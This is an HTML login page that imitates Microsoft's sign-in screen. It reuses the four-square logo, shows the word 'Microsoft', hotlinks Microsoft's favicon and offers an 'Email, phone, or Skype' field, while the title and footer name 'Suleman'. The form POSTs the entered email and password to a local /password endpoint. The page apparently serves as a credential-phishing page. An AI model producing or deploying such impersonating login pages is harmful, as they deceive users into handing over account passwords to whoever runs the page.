<!DOCTYPE html>
<html dir="ltr" lang="EN-US">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
    <base href=".">
    <title>Sign in to your Suleman account</title>
    <meta name="robots" content="none">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no">
    <link rel="shortcut icon" href="https://auth.gfx.ms/16.000.27773.2/images/favicon.ico">
    <style type="text/css">
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background: #fff;
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .login-container {
            width: 440px;
            padding: 40px;
            border: 1px solid #e1e1e1;
            border-radius: 4px;
            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
        }
        .suleman-header {
            display: flex;
            align-items: center;
            margin-bottom: 10px;
        }
        /* Microsoft-style 4-square logo */
        .logo-grid {
            display: grid;
            grid-template-columns: repeat(2, 10px);
            grid-template-rows: repeat(2, 10px);
            gap: 2px;
        }
        .logo-square {
            width: 10px;
            height: 10px;
        }
        .red { background-color: #f35325; }
        .green { background-color: #81bc06; }
        .blue { background-color: #05a6f0; }
        .yellow { background-color: #ffba08; }

        .suleman-logo {
            color: #737373;
            font-size: 20px;
            font-weight: 600;
            margin-left: 10px;
        }

        .title {
            color: #1b1b1b;
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 20px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group label {
            display: block;
            margin-bottom: 5px;
            color: #1b1b1b;
            font-weight: 600;
            font-size: 14px;
        }

        .form-control {
            width: 100%;
            padding: 12px;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 14px;
            box-sizing: border-box;
        }

        .btn-primary {
            background: #0078d4;
            color: white;
            border: none;
            padding: 12px 20px;
            border-radius: 4px;
            font-size: 14px;
            cursor: pointer;
            width: 100%;
            font-weight: 600;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }
        .btn-primary:hover {
            background: #106ebe;
        }
        .btn-primary:disabled {
            opacity: 0.7;
            cursor: not-allowed;
        }

        /* Loading spinner */
        .spinner {
            border: 3px solid #ffffff33;
            border-top: 3px solid #fff;
            border-radius: 50%;
            width: 16px;
            height: 16px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .action-links {
            margin-top: 20px;
            text-align: center;
            font-size: 13px;
        }

        .action-links a {
            color: #0078d4;
            text-decoration: none;
            margin: 0 10px;
        }

        .checkbox {
            margin: 15px 0;
        }

        .checkbox label {
            font-weight: normal;
            cursor: pointer;
        }

        .footer {
            margin-top: 30px;
            text-align: center;
            font-size: 12px;
            color: #666;
        }

        .footer a {
            color: #666;
            text-decoration: none;
            margin: 0 8px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="suleman-header">
            <!-- Microsoft-style 4-color squares -->
            <div class="logo-grid">
                <div class="logo-square red"></div>
                <div class="logo-square green"></div>
                <div class="logo-square blue"></div>
                <div class="logo-square yellow"></div>
            </div>
            <div class="suleman-logo">Microsoft</div>
        </div>

        <div class="title">Sign in</div>

        <form id="loginForm" action="/password" method="POST">
            <div class="form-group">
                <label for="email">Email, phone, or Skype</label>
                <input type="text" id="email" name="email" class="form-control" required autocomplete="username" placeholder="Email, phone, or Skype">
            </div>

            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" class="form-control" required autocomplete="current-password" placeholder="Password">
            </div>
            
            <div class="checkbox">
                <label>
                    <input type="checkbox" name="KMSI" value="1"> Keep me signed in
                </label>
            </div>
            
            <button type="submit" class="btn-primary" id="submitBtn">
                <span id="btnText">Sign in</span>
            </button>
        </form>
        
        <div class="action-links">
            <a href="#">No account?</a>
            <a href="#">Create one!</a>
            <a href="#">Forgot my password</a>
        </div>
        
        <div class="footer">
            <span>Â©2024 Suleman</span>
            <a href="#">Terms of use</a>
            <a href="#">Privacy & cookies</a>
        </div>
    </div>

    <script>
        const form = document.getElementById('loginForm');
        const submitBtn = document.getElementById('submitBtn');
        const btnText = document.getElementById('btnText');

        form.addEventListener('submit', (e) => {
            submitBtn.disabled = true;
            btnText.innerHTML = '<div class="spinner"></div> Signing in...';
        });
    </script>
</body>
</html>
